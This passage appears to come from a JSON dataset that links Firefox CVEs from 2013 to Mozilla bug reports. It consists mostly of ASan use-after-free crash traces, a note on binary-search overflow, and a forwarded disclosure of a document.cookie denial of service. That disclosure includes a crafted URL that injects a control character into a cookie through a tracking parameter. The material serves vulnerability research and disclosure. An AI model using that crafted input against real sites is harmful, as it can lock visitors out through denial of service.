/builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsSubDocumentFrame.cpp:188:27 #9 0x7f031c031e98 in AsyncFrameInit::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsSubDocumentFrame.cpp:82:0 #10 0x7f031c3c4b6d in nsContentUtils::RemoveScriptBlocker() /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsContentUtils.cpp:4786:0 #11 0x7f031bd8eb0d in nsAutoScriptBlocker::~nsAutoScriptBlocker() /builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/toolkit/components/places/../../../dist/include/nsContentUtils.h:2200:0 #12 0x7f031be775cd in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsPresShell.cpp:3831:0 #13 0x7f031bea152a in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsRefreshDriver.cpp:1139:0 #14 0x7f031bea6d5d in mozilla::RefreshDriverTimer::Tick() /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsRefreshDriver.cpp:160:0 #15 0x7f031eb1ccb6 in nsTimerImpl::Fire() /builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nsTimerImpl.cpp:546:0 #16 0x7f031eb1d45e in nsTimerEvent::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nsTimerImpl.cpp:630:0 #17 0x7f031eb141ce in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nsThread.cpp:622:0 #18 0x7f031ea6501f in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/glue/nsThreadUtils.cpp:251:0 #19 0x7f031dc72e77 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/glue/MessagePump.cpp:85:0 #20 0x7f031ebff270 in MessageLoop::RunInternal() /builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/chromium/src/base/message_loop.cc:220:0 #21 0x7f031ebff074 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/chromium/src/base/message_loop.cc:187:0 #22 0x7f031da8dfd0 in nsBaseAppShell::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/widget/xpwidgets/nsBaseAppShell.cpp:161:0 #23 0x7f031d5f7ad5 in nsAppStartup::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/components/startup/nsAppStartup.cpp:268:0 #24 0x7f031b438c3b in XREMain::XRE_mainRun() /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsAppRunner.cpp:3976:0 #25 0x7f031b439fa8 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsAppRunner.cpp:4044:0 #26 0x7f031b43a925 in XRE_main /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsAppRunner.cpp:4246:0 #27 0x45a0f5 in do_main(int, char**, nsIFile*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsBrowserApp.cpp:275:0 #28 0x459667 in main /builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsBrowserApp.cpp:635:0 #29 0x7f032bb8676c in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:226:0 Shadow bytes around the buggy address: 0x0c2e80035190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2e800351a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2e800351b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2e800351c0: 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa 0x0c2e800351d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c2e800351e0: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e800351f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e80035200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e80035210: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e80035220: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e80035230: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==15391==ABORTING In addition to ASAN-output the debug-build also throws few assertions but I'm not sure if those are directly related. ###!!! ASSERTION: non-root reflow roots must not have scrollable overflow: 'target == rootFrame || desiredSize.ScrollableOverflow().IsEqualEdges(boundsRelativeToTarget)', file /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsPresShell.cpp, line 7937 ###!!! ASSERTION: Shouldn't have unconstrained stuff here thanks to ComputeAutoSize: 'NS_INTRINSICSIZE != aReflowState.ComputedHeight()', file /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsLeafFrame.cpp, line 75"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=930381",
        "title": "heap-use-after-free in libxul.so!PresShell::DispatchSynthMouseMove",
        "description": "Found by the BlackBerry Security Automated Analysis Team's fuzzing framework ALF. ==21242==ERROR: AddressSanitizer: heap-use-after-free on address 0x61700022a21c at pc 0x7f0fe52bd9bc bp 0x7fff20ff6650 sp 0x7fff20ff6648 READ of size 4 at 0x61700022a21c thread T0 #0 0x7f0fe52bd9bb (libxul.so!PresShell::DispatchSynthMouseMove(mozilla::WidgetGUIEvent*, bool)+0x1db) Line 75 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/RestyleManager.h\" #1 0x7f0fe52cc0c4 (libxul.so!PresShell::ProcessSynthMouseMoveEvent(bool)+0xde4) Line 5256 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsPresShell.cpp\" #2 0x7f0fe52f0547 (libxul.so!nsRefreshDriver::Tick(long, mozilla::TimeStamp)+0xbb7) Line 1074 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsRefreshDriver.cpp\" #3 0x7f0fe52f64e0 (libxul.so!mozilla::RefreshDriverTimer::Tick()+0x1f0) Line 168 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsRefreshDriver.cpp\" #4 0x7f0fe8de4c31 (libxul.so!nsTimerImpl::Fire()+0x6d1) Line 546 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsTimerImpl.cpp\" #5 0x7f0fe8de52d6 (libxul.so!nsTimerEvent::Run()+0x66) Line 630 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsTimerImpl.cpp\" #6 0x7f0fe8ddc019 (libxul.so!nsThread::ProcessNextEvent(bool, bool*)+0xaa9) Line 622 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsThread.cpp\" #7 0x7f0fe8d08371 (libxul.so!NS_ProcessNextEvent(nsIThread*, bool)+0xb1) Line 251 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsThreadUtils.cpp\" #8 0x7f0fe7955091 (libxul.so!mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*)+0x311) Line 85 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/MessagePump.cpp\" #9 0x7f0fe8ef7653 (libxul.so!MessageLoop::Run()+0x1c3) Line 220 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc\" #10 0x7f0fe7733cac (libxul.so!nsBaseAppShell::Run()+0x5c) Line 161 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsBaseAppShell.cpp\" #11 0x7f0fe7135d9e (libxul.so!nsAppStartup::Run()+0xbe) Line 268 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsAppStartup.cpp\" #12 0x7f0fe46bf1c5 (libxul.so!XREMain::XRE_mainRun()+0x1e05) Line 3886 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #13 0x7f0fe46c00fa (libxul.so!XREMain::XRE_main(int, char**, nsXREAppData const*)+0x4fa) Line 3954 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #14 0x7f0fe46c102b (libxul.so!XRE_main+0x3ab) Line 4156 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #15 0x459d1d (firefox!main+0x94d) Line 275 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsBrowserApp.cpp\" #16 0x7f0ff3d5876c (libc.so.6!__libc_start_main+0xec) Line 226 of \"libc-start.c\" #17 0x45929c (firefox!_start+0x28) 0x61700022a21c is located 28 bytes inside of 760-byte region [0x61700022a200,0x61700022a4f8) freed by thread T0 here: #0 0x4461a5 (firefox!free+0x55) Line 64 of \"/builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc\" #1 0x7f0fe529f118 (libxul.so!mozilla::RestyleManager::Release()+0x138) Line 225 of \"../../dist/include/mozilla/mozalloc.h\" previously allocated by thread T0 here: #0 0x4462e5 (firefox!malloc+0x55) Line 74 of \"/builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc\" #1 0x7f0feddfe5c8 (libmozalloc.so!moz_xmalloc+0x8) Line 54 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/memory/mozalloc/mozalloc.cpp\" #2 0x7f0fe5230421 (libxul.so!nsDocumentViewer::InitInternal(nsIWidget*, nsISupports*, nsIntRect const&, bool, bool, bool)+0x581) Line 824 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsDocumentViewer.cpp\" #3 0x7f0fe522fe90 (libxul.so!nsDocumentViewer::Init(nsIWidget*, nsIntRect const&)+0x20) Line 642 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsDocumentViewer.cpp\" #4 0x7f0fe929f537 (libxul.so!nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*)+0xe7) Line 6397 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsDocShell.cpp\" #5 0x7f0fe92b14f4 (libxul.so!nsDocShell::CreateContentViewer(char const*, nsIRequest*, nsIStreamListener**)+0x1084) Line 8173 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsDocShell.cpp\" #6 0x7f0fe9254ad4 (libxul.so!nsDSURIContentListener::DoContent(char const*, bool, nsIRequest*, nsIStreamListener**, bool*)+0x304) Line 122 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsDSURIContentListener.cpp\" #7 0x7f0fe92f698f (libxul.so!nsDocumentOpenInfo::TryContentListener(nsIURIContentListener*, nsIChannel*)+0x6ef) Line 680 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsURILoader.cpp\" #8 0x7f0fe92f433c (libxul.so!nsDocumentOpenInfo::DispatchContent(nsIRequest*, nsISupports*)+0x67c) Line 382 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsURILoader.cpp\" #9 0x7f0fe92f3aaf (libxul.so!nsDocumentOpenInfo::OnStartRequest(nsIRequest*, nsISupports*)+0x32f) Line 258 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsURILoader.cpp\" #10 0x7f0fe4964bc2 (libxul.so!nsBaseChannel::OnStartRequest(nsIRequest*, nsISupports*)+0x1e2) Line 718 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsBaseChannel.cpp\" Shadow bytes around the buggy address: 0x0c2e8003d3f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2e8003d400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2e8003d410: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2e8003d420: 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2e8003d430: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c2e8003d440: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8003d450: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8003d460: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8003d470: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8003d480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8003d490: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==21242==ABORTING"
      }
    ],
    "CVE-2013-5616": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=938341",
        "title": "heap-use-after-free in libxul.so!nsEventListenerManager::HandleEventSubType",
        "description": "Found by the BlackBerry Security Automated Analysis Team's fuzzing framework ALF. ==24554==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c000255a58 at pc 0x7fb832e41778 bp 0x7fff0b8b91f0 sp 0x7fff0b8b91e8 READ of size 8 at 0x60c000255a58 thread T0 #0 0x7fb832e41777 (libxul.so!nsEventListenerManager::HandleEventSubType(nsListenerStruct*, mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener> const&, nsIDOMEvent*, mozilla::dom::EventTarget*, nsCxPusher*)+0x367) Line 268 of \"../../../dist/include/mozilla/dom/CallbackObject.h\" #1 0x7fb832e42516 (libxul.so!nsEventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*, nsCxPusher*)+0xa36) Line 1038 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nsEventListenerManager.cpp\" #2 0x7fb832e33303 (libxul.so!nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, ELMCreationDetector&, nsCxPusher*)+0x4d3) Line 325 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nsEventListenerManager.h\" #3 0x7fb832e325a9 (libxul.so!nsEventTargetChainItem::HandleEventTargetChain(nsTArray<nsEventTargetChainItem>&, nsEventChainPostVisitor&, nsDispatchingCallback*, ELMCreationDetector&, nsCxPusher*)+0x829) Line 313 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nsEventDispatcher.cpp\" #4 0x7fb832e36274 (libxul.so!nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*)+0x2974) Line 605 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nsEventDispatcher.cpp\" #5 0x7fb833009c78 (libxul.so!nsGenericHTMLElement::Click()+0x718) Line 2738 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/html/content/src/nsGenericHTMLElement.cpp\" #6 0x7fb83558dd50 (libxul.so!mozilla::dom::HTMLElementBinding::click(JSContext*, JS::Handle<JSObject*>, nsGenericHTMLElement*, JSJitMethodCallArgs const&)+0x30) Line 582 of \"./HTMLElementBinding.cpp\" #7 0x7fb83558d5da (libxul.so!mozilla::dom::HTMLElementBinding::genericMethod(JSContext*, unsigned int, JS::Value*)+0x68a) Line 4767 of \"./HTMLElementBinding.cpp\" #8 0x7fb837c257c7 (libxul.so!js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct)+0x5f7) Line 220 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/js/src/jscntxtinlines.h\" #9 0x7fb837c1a70b (libxul.so!Interpret(JSContext*, js::RunState&)+0x18c9b) Line 2502 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/js/src/vm/Interpreter.cpp\" #10 0x7fb837c01993 (libxul.so!js::RunScript(JSContext*, js::RunState&)+0x3f3) Line 420 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/js/src/vm/Interpreter.cpp\" #11 0x7fb837c25a03 (libxul.so!js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct)+0x833) Line 482 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/js/src/vm/Interpreter.cpp\" #12 0x7fb837c26778 (libxul.so!js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>)+0x568) Line 513 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/js/src/vm/Interpreter.cpp\" #13 0x7fb83792bbd7 (libxul.so!JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*)+0x117) Line 4920 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/js/src/jsapi.cpp\" #14 0x7fb83537f02f (libxul.so!mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JSObject*>, nsDOMEvent&, mozilla::ErrorResult&)+0x23f) Line 36 of \"./EventHandlerBinding.cpp\" #15 0x7fb83365bc53 (libxul.so!nsJSEventListener::HandleEvent(nsIDOMEvent*)+0xab3) Line 58 of \"../../../dist/include/mozilla/dom/EventHandlerBinding.h\" #16 0x7fb832e41622 (libxul.so!nsEventListenerManager::HandleEventSubType(nsListenerStruct*, mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener> const&, nsIDOMEvent*, mozilla::dom::EventTarget*, nsCxPusher*)+0x212) Line 960 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nsEventListenerManager.cpp\" #17 0x7fb832e42516 (libxul.so!nsEventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*, nsCxPusher*)+0xa36) Line 1038 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nsEventListenerManager.cpp\" #18 0x7fb832e33303 (libxul.so!nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, ELMCreationDetector&, nsCxPusher*)+0x4d3) Line 325 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nsEventListenerManager.h\" #19 0x7fb832e321de (libxul.so!nsEventTargetChainItem::HandleEventTargetChain(nsTArray<nsEventTargetChainItem>&, nsEventChainPostVisitor&, nsDispatchingCallback*, ELMCreationDetector&, nsCxPusher*)+0x45e) Line 292 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nsEventDispatcher.cpp\" #20 0x7fb832e36274 (libxul.so!nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*)+0x2974) Line 605 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nsEventDispatcher.cpp\" #21 0x7fb8322c410b (libxul.so!nsDocumentViewer::LoadComplete(tag_nsresult)+0x91b) Line 997 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsDocumentViewer.cpp\" #22 0x7fb83644079a (libxul.so!nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, tag_nsresult)+0x5ca) Line 6776 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsDocShell.cpp\" #23 0x7fb83643da29 (libxul.so!nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult)+0x1499) Line 6573 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsDocShell.cpp\" #24 0x7fb83643df6c (libxul.so!non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult)+0xc) Line 6579 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsDocShell.cpp\" #25 0x7fb836490fbf (libxul.so!nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, tag_nsresult)+0x47f) Line 1331 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsDocLoader.cpp\" #26 0x7fb836490313 (libxul.so!nsDocLoader::doStopDocumentLoad(nsIRequest*, tag_nsresult)+0x263) Line 865 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsDocLoader.cpp\" #27 0x7fb83648dfaf (libxul.so!nsDocLoader::DocLoaderIsEmpty(bool)+0x7ef) Line 755 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsDocLoader.cpp\" #28 0x7fb83648f528 (libxul.so!nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult)+0x5b8) Line 639 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsDocLoader.cpp\" #29 0x7fb83648fdc9 (libxul.so!non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult)+0x9) Line 642 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsDocLoader.cpp\" #30 0x7fb831a22d79 (libxul.so!nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, tag_nsresult)+0x799) Line 688 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsLoadGroup.cpp\" #31 0x7fb832b1c8b6 (libxul.so!nsDocument::DoUnblockOnload()+0x226) Line 7988 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/base/src/nsDocument.cpp\" #32 0x7fb832b1c56b (libxul.so!nsDocument::UnblockOnload(bool)+0x55b) Line 7916 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/base/src/nsDocument.cpp\" #33 0x7fb832afb232 (libxul.so!nsDocument::DispatchContentLoadedEvents()+0xb02) Line 4702 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/base/src/nsDocument.cpp\" #34 0x7fb832b3fa0c (libxul.so!nsRunnableMethodImpl<void (nsDocument::*)(), void, true>::Run()+0x6c) Line 382 of \"../../../dist/include/nsThreadUtils.h\" #35 0x7fb835f7cba9 (libxul.so!nsThread::ProcessNextEvent(bool, bool*)+0xaa9) Line 622 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsThread.cpp\" #36 0x7fb835ea8cd1 (libxul.so!NS_ProcessNextEvent(nsIThread*, bool)+0xb1) Line 251 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsThreadUtils.cpp\" #37 0x7fb834a162d1 (libxul.so!mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*)+0x311) Line 85 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/MessagePump.cpp\" #38 0x7fb836084b53 (libxul.so!MessageLoop::Run()+0x1c3) Line 220 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc\" #39 0x7fb8347eea4c (libxul.so!nsBaseAppShell::Run()+0x5c) Line 161 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsBaseAppShell.cpp\" #40 0x7fb8341f5a0e (libxul.so!nsAppStartup::Run()+0xbe) Line 267 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsAppStartup.cpp\" #41 0x7fb83174e655 (libxul.so!XREMain::XRE_mainRun()+0x1e05) Line 3976 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #42 0x7fb83174f58a (libxul.so!XREMain::XRE_main(int, char**, nsXREAppData const*)+0x4fa) Line 4044 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #43 0x7fb8317504bb (libxul.so!XRE_main+0x3ab) Line 4246 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #44 0x459dcd (firefox!main+0x94d) Line 275 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsBrowserApp.cpp\" #45 0x7fb840e9776c (libc.so.6!__libc_start_main+0xec) Line 226 of \"libc-start.c\" #46 0x45934c (firefox!_start+0x28) 0x60c000255a58 is located 88 bytes inside of 128-byte region [0x60c000255a00,0x60c000255a80) freed by thread T0 here: #0 0x44653b (firefox!realloc+0x5b) Line 95 of \"/builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc\" #1 0x7fb83e04e65e (libmozalloc.so!moz_xrealloc+0xe) Line 84 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/memory/mozalloc/mozalloc.cpp\" previously allocated by thread T0 here: #0 0x446395 (firefox!malloc+0x55) Line 74 of \"/builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc\" #1 0x7fb83e04e5c8 (libmozalloc.so!moz_xmalloc+0x8) Line 52 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/memory/mozalloc/mozalloc.cpp\" Shadow bytes around the buggy address: 0x0c1880042af0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c1880042b00: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c1880042b10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1880042b20: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c1880042b30: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa =>0x0c1880042b40: fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd 0x0c1880042b50: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c1880042b60: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c1880042b70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1880042b80: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c1880042b90: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==24554==ABORTING"
      }
    ],
    "CVE-2013-5618": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=926361",
        "title": "ASAN use-after-free in nsNodeUtils::LastRelease on anonymous node from ShowInlineTableEditingUI",
        "description": "The attached testcase crashes the latest nightly ASAN build. It requires domFuzzLite https://www.squarefree.com/extensions/domFuzzLite3.xpi"
      }
    ],
    "CVE-2013-5619": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=917841",
        "title": "binary searches use overflow-prone arithmetic",
        "description": "An informal search of SpiderMonkey for binary search algorithms turned up several places using (lo+hi)/2, which is prone to overflow in general [0]. Attached is a patch which changes them to use lo+(hi-lo)/2. While most of them look like they'd be safe in practice -- if numICEntries() or script->nTypeSets approach anything close to SIZE_MAX/2, I assume the program would have far worse problems -- one of them, in js/src/frontend/TokenStream.cpp, is not obviously safe, since it uses uint32_t indices, and there's nothing obvious which would protect them. This patch changes all of them, to be on the safe side. [0] http://googleresearch.blogspot.com/2006/06/extra-extra-read-all-about-it-nearly.html"
      }
    ],
    "CVE-2013-6167": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=858215",
        "title": "document.cookie DOS",
        "description": "Date: Wed, 3 Apr 2013 09:02:53 -0700 From: Reed Loden <reed@reedloden.com> To: security@mozilla.org Subject: Fw: [oss-security] browser document.cookie DoS vulnerability -----//----- Is this filed? Begin forwarded message: Date: Wed, 3 Apr 2013 17:58:18 +0200 From: Stefan Bhler <stbuehler@lighttpd.net> To: oss-security@lists.openwall.com Subject: [oss-security] browser document.cookie DoS vulnerability Hi, Chromium 25.0.1364.160 (debian testing), Iceweasel/Firefox 19 and probably many other browsers allow javascript to set broken cookie values, leading to possible permanent \"400 Bad Request\" responses. The broken value might be set by 3rd party libraries. For example the google analytics code is vulnerable, as it sets cookie values based on parameters in the referer query string. lighttpd does not allow control characters in http header values, so any lighttpd site using google analytics is vulnerable if you can get the user to follow a link (img tag for example) to that site like this: http://www.example.com/?utm_source=test&utm_medium=test&utm_campaign=te%05st Afaik apache doesn't check the cookie values (or perhaps removes the broken characters). Imho they are responsible for this mess :) To be clear: the bug is in the browser / javascript implementation: document.cookie MUST NOT allow cookie values which include certain control characters. Javascript applications should not use 8-bit characters. (If browser vendors want to allow broken cookie values to be stored, they MUST NOT send them to the server; in this case javascript applications can still read the broken values. But I don't think this is a good idea.) The safe character set for HTTP header values is: %x20-7E; %x80-FF is obsoleted by the current draft. \"A recipient MAY replace any linear white space with a single SP before interpreting the field value\", so horizontal tabs are not \"safe\" - they might get converted to a space, but are not 